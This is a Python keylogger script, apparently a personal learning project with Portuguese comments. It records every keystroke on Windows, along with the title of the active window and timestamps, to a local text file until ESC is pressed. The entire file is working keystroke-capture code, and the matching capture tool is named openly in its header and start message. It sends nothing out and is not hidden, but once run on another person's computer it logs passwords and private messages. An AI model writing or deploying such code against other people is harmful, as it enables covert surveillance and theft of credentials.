"""
---------------------------------------------------------
Projeto: Keylogger em Python
Autor: Guilherme Pinheiro Santos
Descrição:
    Este script captura as teclas digitadas no teclado e salva em um arquivo texto.
    Também registra a janela ativa, horário das teclas e status da tecla Caps Lock.
Bibliotecas usadas:
    - pynput (para monitorar teclas)
    - win32gui (para identificar janela ativa no Windows)
---------------------------------------------------------
"""

#Imports
from pynput import keyboard
import win32gui
from datetime import datetime


# Nome do arquivo onde as teclas digitadas serão salvas
log_file = "captura_teclas.txt"

# Armazenar o nome da janela ativa no momento da digitação
janela_atual = ""

# Flag que indica se o Caps Lock está ativo
caps_lock_ativo = False


def get_janela_ativa():
    return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def on_press(key):
    global caps_lock_ativo
    global janela_atual

    nova_janela = get_janela_ativa()
    if nova_janela != janela_atual:
        janela_atual = nova_janela
        with open (log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n[{datetime.now().strftime('%H:%M:%S')}] Janela ativa: {janela_atual}\n")


    if key == keyboard.Key.caps_lock:
        caps_lock_ativo = not caps_lock_ativo

    try:
        with open(log_file, "a") as f:
            if caps_lock_ativo:
                f.write(f"{key.char.upper()}")
            else:
                f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.enter:
                f.write("[ENTER]\n")  # pula uma linha
            else:
                f.write(teclas_especiais.get(str(key), f"[{key}]"))

def on_release(key):
  if key == keyboard.Key.esc:
      print("Encerrando o Keylogger.")
      return False

teclas_especiais = {
    'Key.space': '[ESPAÇO]',
    'Key.enter': '[ENTER]',
    'Key.tab': '[TAB]',
    'Key.backspace': '[BACKSPACE]',
    'Key.esc': '[ESC]',
    'Key.shift': '[SHIFT]',
    'Key.ctrl_l': '[CTRL]',
    'Key.crtl_r': '[CTRL]',
    'Key.alt_gr': '[ALT GR]',
    'Key.alt_l': '[ALT]',
    'Key.alt_r': '[ALT]',
    'Key.caps_lock': '[CAPSLOCK]'
}

with open(log_file, "w") as f:
    f.write("")

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    print('Keylogger iniciado "Vamos capturar algumas teclas meu pequeno hacker." Precione ESC para encerrar.')
    listener.join()